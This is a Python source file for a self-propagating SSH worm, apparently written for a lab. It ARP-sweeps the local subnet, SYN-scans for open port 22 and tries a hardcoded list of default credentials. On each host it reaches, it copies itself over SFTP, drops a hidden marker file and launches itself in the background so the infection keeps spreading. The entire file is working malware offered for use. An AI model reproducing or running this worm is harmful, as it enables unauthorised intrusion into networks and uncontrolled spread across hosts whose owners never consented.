#!/usr/bin/env python3
"""worm2.py - Scapy-powered v2 of the SSH worm.
Scapy handles discovery: an ARP sweep finds live hosts, a TCP SYN scan

finds which of them have SSH open, then paramiko copies this script to each target and runs it there, so every new host repeats the sweep from its own subnet.

Run as root (scapy needs raw sockets): sudo python3 worm2.py"""

import os
import socket
import sys
import time

import paramiko
from scapy.all import ARP, Ether, IP, TCP, conf, send, sr1, srp

PORT = 22
CREDENTIALS = [("root", "toor"), ("admin", "admin"), ("kali", "kali")]
MARKER = "/tmp/.worm2_marker"
REMOTE_PATH = "/tmp/worm2.py"
ME = os.path.abspath(sys.argv[0])
conf.verb = 0


def local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    finally:
        s.close()


def arp_sweep(my_ip):
    """Layer-2 ARP sweep: every live IP on our /24, even ones that ignore ping."""
    subnet = my_ip.rsplit(".", 1)[0]
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") /
                 ARP(pdst=f"{subnet}.0/24"), timeout=2)
    return [rcv.psrc for _, rcv in ans if rcv.psrc != my_ip]


def ssh_open(ip):
    """TCP SYN half-open scan: True if port 22 answers SYN-ACK."""
    syn = IP(dst=ip) / TCP(dport=PORT, flags="S", sport=13337, seq=1000)
    ans = sr1(syn, timeout=2)
    if ans is None or TCP not in ans:
        return False
    if ans[TCP].flags == 0x12:                     # SYN-ACK means open
        send(IP(dst=ip) / TCP(dport=PORT, flags="R", sport=13337, seq=1001))
        return True
    return False


def is_infected(sftp):
    try:
        sftp.stat(MARKER)
        return True
    except OSError:
        return False


def infect(ip):
    for user, password in CREDENTIALS:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(ip, port=PORT, username=user,
                            password=password, timeout=5)
        except paramiko.AuthenticationException:
            client.close()
            continue                    # wrong creds, try the next pair
        except (paramiko.SSHException, OSError):
            return                      # SSH unreachable, skip host
        try:
            sftp = client.open_sftp()
            if is_infected(sftp):
                return                  # already hit, stop here
            sftp.put(ME, REMOTE_PATH)   # duplicate the worm
            with sftp.open(MARKER, "w") as f:
                f.write("worm was here\n")
            sftp.close()
            client.exec_command(
                f"nohup python3 {REMOTE_PATH} >/dev/null 2>&1 &")
            time.sleep(1)
            print(f"[+] infected {ip} ({user})")
            return
        except OSError:
            return
        finally:
            client.close()


def main():
    my_ip = local_ip()
    if not os.path.exists(MARKER):     # claim this host on first run
        with open(MARKER, "w") as f:
            f.write("origin\n")
    print(f"[*] worm2 running on {my_ip}")
    live = arp_sweep(my_ip)
    print(f"[*] ARP sweep: {len(live)} live hosts found")
    for ip in sorted(live, key=lambda a: tuple(map(int, a.split(".")))):
        if ssh_open(ip):
            print(f"[*] {ip}:22 open")
            infect(ip)
    print("[*] sweep finished")


if __name__ == "__main__":
    main()
